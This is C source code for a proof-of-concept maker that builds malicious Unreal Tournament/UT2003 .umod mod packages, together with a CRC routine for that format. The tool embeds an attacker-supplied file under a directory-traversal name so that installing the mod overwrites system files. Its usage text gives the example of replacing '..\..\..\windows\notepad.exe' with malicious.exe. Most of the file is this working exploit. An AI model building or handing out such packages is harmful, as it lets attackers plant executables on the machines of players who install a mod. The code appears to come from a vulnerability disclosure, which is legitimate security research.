/*

by Luigi Auriemma

UNIX & WIN VERSION


UMOD CRC calculation 0.2
by Luigi Auriemma
e-mail: aluigi@altervista.org

web:    http://aluigi.altervista.org


This function must be used to calculate the CRC checksum used in the
umod files.

For more informations about the umod file format read my document
and my relative 
tools on my website in the section dedicated to the
Unreal engine.


How to use, 
the 2 possible methods:printf("CRC: 0x%08lx\n", umodcrc("test.umod", 0));
2) 
fd = fopen("test.umod", "rb");printf("CRC: 0x%08lx\n", umodcrc(NULL, fd);



Return value:
The value is the CRC of the file or 0xffffffff (-1) 
if there are
errors


Practically if you pass NULL as filename, 
the function will use the FILE
descriptor passed as second argument 
otherwise the function will open the
file using the first parameter (filename)


This source is covered by GNU/GPL



*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include "umodcrc.h"


#ifndef u_long
    #define u_long  unsigned long

#endif

#ifndef u_char

    #define u_char  unsigned char

#endif







#define UT2BUFFSZ   0x4000





    /* complete CRC calculation */



u_long umodcrc(
    
	u_char *filename,   /* name of the file for CRC calculation */
    
	FILE *fdopen        /* FILE descriptor */

);



    
/* CRC algorithm */


u_long appmemcrc(

	u_char *data,       /* buffer containing the data from the file */
    
	u_long size,        /* size of the data */

	u_long oldcrc       /* previous CRC, it must start from 0 */

);







u_long  gcrctable[] = {
 0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9,
 0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,
 0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61,
 0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,
 0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9,
 0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,
 0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011,
 0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,
 0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039,
 0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,
 0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81,
 0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,
 0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49,
 0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,
 0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1,
 0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,
 0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae,
 0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,
 0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16,
 0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,
 0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde,
 0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,
 0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066,
 0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,
 0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e,
 0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,
 0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6,
 0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,
 0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e,
 0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,
 0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686,
 0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,
 0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637,
 0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,
 0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f,
 0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,
 0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47,
 0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,
 0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff,
 0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,
 0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7,
 0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,
 0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f,
 0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,
 0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7,
 0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,
 0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f,
 0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,
 0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640,
 0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,
 0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8,
 0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,
 0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30,
 0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,
 0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088,
 0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,
 0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0,
 0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,
 0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18,
 0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,
 0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0,
 0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,
 0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668,
 0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4 };








u_long umodcrc(u_char *filename, FILE *fdopen) {
	FILE            *fd;
	int             err,
 len;
	u_char          *buff;
	u_long          crc = 0x00000000,
oldoff = 0;
	struct stat	xstat;


    
	
	if(filename) {
        
		fd = fopen(filename, "rb");

		if(!fd) return(-1);
    
	} else {

		fd = fdopen;
		oldoff = ftell(fd);     // methodic and ordinate 8-)
	}

    

	err = fstat(fileno(fd), &xstat);


	if(err < 0) return(-1);
	if(xstat.st_size >= 20) xstat.st_size -= 20;

	else return(-1);



	buff = malloc(UT2BUFFSZ);
	if(!buff) return(-1);
	len = UT2BUFFSZ;


	do {

		if(len > xstat.st_size) len = xstat.st_size;
		err = fread(buff, len, 1, fd);
		if(err != 1) break;
		crc = appmemcrc(buff, len, crc);
		xstat.st_size -= len;

	} while(xstat.st_size);

	if(filename) fclose(fd);

	else fseek(fd, oldoff, SEEK_SET);



	free(buff);

	return(crc);


}










u_long appmemcrc(u_char *data, u_long size, u_long oldcrc)
{

    oldcrc = ~oldcrc;

    for(; size > 0; size--, data++) {

        oldcrc = (oldcrc << 8) ^ gcrctable[*data ^ (oldcrc >> 24)];

    }

    return(~oldcrc);

}




/********************************************************************/


#ifdef WIN32
    #include <direct.h>
    #include <malloc.h>

    #define u_long  unsigned long
    #define u_char  unsigned char
#else
    #include <unistd.h>
    #include <sys/stat.h>
#endif




#define VER         "0.1"
#define BUFFSZ      16384
#define UMODSIGN    0x9fe3c5a3
#define MANIFEST    \
    "[Setup]\n" \
    "Product=Arbitrary file ovewriting by Luigi Auriemma\n" \
    "Version=1\n" \
    "Archive=%s\n" \
    "SrcPath=.\n" \
    "MasterPath=..\n" \
    "StartProduct=UMODPoC\n" \
    "\n" \
    "Group=SetupGroup\n" \
    "\n" \
    "[SetupGroup]\n" \
    "Copy=(Src="MANINI",Master="MANINI",Flags=3)\n" \
    "File=(Src=%s)\n"
#define MANINI      "System\\Manifest.ini"




void std_err(void);
void io_err(void);




int main(int argc, char *argv[]) {
    FILE    *fdin,
            *fdmod;
    u_char  *buff;
    u_long  offset,
            manifestsz;
    int     err;
    struct  stat    xstat;
    struct end {
        u_long  sign;
        u_long  indexstart;
        u_long  indexend;
        u_long  one;
        u_long  crc;
    } end;


    setbuf(stdout, NULL);

    fputs("\n"
        "UMOD arbitrary file overwriting proof-of-concept maker "VER"\n"
        "  Vulnerable games:\n"
        "  - Unreal Tournament      <= 451b\n"
        "  - Unreal Tournament 2003 <= 2225\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\n"
            "Usage: %s <malicious_file> <\"fake_file_name\"> <file.umod/ut2mod>\n"
            "\n"
            "You must use a filename with directory traversal exploitation\n"
            "For example:\n"
            "..\\..\\..\\autoexec.bat\n"
            "..\\..\\..\\windows\\system.ini\n"
            "\n"
            "Simple usage example:\n"
            "\n"
            "%s malicious.exe \"..\\..\\..\\windows\\notepad.exe\" useme.umod\n"
            "\n", argv[0], argv[0]);
        exit(1);
    }

    printf("Opening %s\n", argv[1]);
    fdin = fopen(argv[1], "rb");
    if(!fdin) std_err();
    err = fstat(fileno(fdin), &xstat);
    if(err < 0) std_err();
    printf("Size: %lu\n\n", xstat.st_size);

    buff = malloc(BUFFSZ + 1);
    if(!buff) std_err();

    manifestsz = snprintf(
        buff,
        BUFFSZ,
        MANIFEST,
        argv[3],
        argv[2]);

    printf("Build virtual "MANINI"\n"
            "Size: %lu\n"
            "\n", manifestsz);

    printf("Creating %s\n\n", argv[3]);
    fdmod = fopen(argv[3], "wb");
    if(!fdmod) std_err();

    if(fwrite(buff, manifestsz, 1, fdmod) != 1) io_err();
    err = manifestsz;
    while(err & 0xf) {      /* useless but all the UMODs does the same */
        fputc(0x00, fdmod);
        err++;
    }

    offset = ftell(fdmod);                          // malicious file offset

    while(1) {
        err = fread(buff, 1, BUFFSZ, fdin);
        if(!err) break;
        if(fwrite(buff, err, 1, fdmod) != 1) io_err();
    }
    fclose(fdin);
    err = ftell(fdmod);
    while(err & 0xf) {      /* useless but all the UMODs does the same */
        fputc(0x00, fdmod);
        err++;
    }

    end.indexstart = err;                           // starting of index

    fputc(2, fdmod);                                // number of files

    fputc(sizeof(MANINI) - 1, fdmod);               // filename size
    fwrite(MANINI, sizeof(MANINI) - 1, 1, fdmod);   // filename
    fwrite("\x00\x00\x00\x00", 4, 1, fdmod);        // starting offset
    fwrite((void *)&manifestsz, 4, 1, fdmod);       // size of the file
    fwrite("\x03\x00\x00\x00", 4, 1, fdmod);        // flag

    err = strlen(argv[2]) + 1;
    fputc(err, fdmod);
    fwrite(argv[2], err, 1, fdmod);
    fwrite((void *)&offset, 4, 1, fdmod);
    fwrite((void *)&xstat.st_size, 4, 1, fdmod);
    fwrite("\x00\x00\x00\x00", 4, 1, fdmod);

    end.sign     = UMODSIGN;                        // umod sign
    end.indexend = ftell(fdmod) + sizeof(end);      // index ending
    end.one      = 1;                               // 1
    end.crc      = 0x00000000;                      // crc (calculated later)

    fwrite((void *)&end, sizeof(end), 1, fdmod);

        /* crc checking */
    fflush(fdmod);
    end.crc = umodcrc(argv[3], 0);
    fseek(fdmod, -4, SEEK_CUR);
    fwrite((void *)&end.crc, 4, 1, fdmod);

    fclose(fdmod);

    printf("\n"
        "Informations about %s:\n"
        "-------------------\n"
        "Index section offset: 0x%08lx\n"
        "Total package size:   %lu\n"
        "CRC:                  %08lx\n"
        "\n"
        "Files contained:\n"
        MANINI"   (used for installation)\n"
        "%s\n"
        "\n"
        "Proof-of-concept successfully created!\n",
        argv[3],
        end.indexstart,
        end.indexend,
        end.crc,
        argv[2]);

    return(0);
}




void std_err(void) {
    perror("\nError");
    exit(1);
}




void io_err(void) {
    fputs("\nError: I/O error, the file is incomplete or the disk space is finished\n", stdout);
    exit(1);
}


